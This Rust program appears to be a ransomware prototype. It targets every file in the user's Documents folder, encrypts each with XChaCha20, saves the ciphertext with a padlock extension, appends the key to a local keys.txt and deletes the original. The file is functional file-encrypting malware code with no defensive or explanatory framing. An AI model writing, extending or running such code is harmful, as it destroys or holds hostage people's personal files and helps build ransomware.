use std::io::Write;
use std::{fs, path::Path};
use std::path::PathBuf;
use anyhow::{Result, Ok};
use orion::aead;

const ENCRYPTED_EXTENSION:	&str	= ".🔒";
const KEY_FILE_NAME:		&str	= "keys.txt";

type CipherAndKey = (Vec<u8>, aead::SecretKey);

// TODO: use streams
// current code isn't capable of encrypting giant files due
// to having to load the whole file into memory


fn main() -> Result<()> {
	let target_dir = format!(
		"{}\\Documents",
		dirs::home_dir().unwrap_or("~".into()).to_string_lossy(),
	);

	let entries = fs::read_dir(target_dir)?;
	for entry in entries {
		let path = entry?.path();

		if path.is_file() {
			encrypt_file(path)?;
		}
	}

	Ok(())
}

fn encrypt_file(path: PathBuf) -> Result<()> {
	let file_name = path.file_name().unwrap().to_string_lossy();

	if !file_name.ends_with(ENCRYPTED_EXTENSION) {
		let encrypted_path = PathBuf::from(
			format!("{}{}", path.display(), ENCRYPTED_EXTENSION)
		);

		// Prepare new file data
		let content = fs::read(&path)?;
		let (ciphertext, key) = encrypt_xchacha20(&content[..])?;

		// Write encrypted data to new file
		fs::write(&encrypted_path, &ciphertext[..])?;
		append_file(KEY_FILE_NAME, key.unprotected_as_bytes())?;
		fs::remove_file(&path)?;
	}

	Ok(())
}

fn encrypt_xchacha20(src: &[u8]) -> Result<CipherAndKey> {
	// check this: https://docs.rs/orion/latest/orion/aead/index.html

	let secret_key = aead::SecretKey::default();
	let ciphertext = aead::seal(&secret_key, src)?;
	//let decrypted_data = aead::open(&secret_key, &ciphertext)?;

	Ok(
		(ciphertext, secret_key)
	)
}

fn append_file<F: AsRef<Path>>(path: F, data: &[u8]) -> Result<()> {
	let mut file = fs::OpenOptions::new()
		.append(true)
		.open(path)?;

	file.write(data)?;

	Ok(())
}
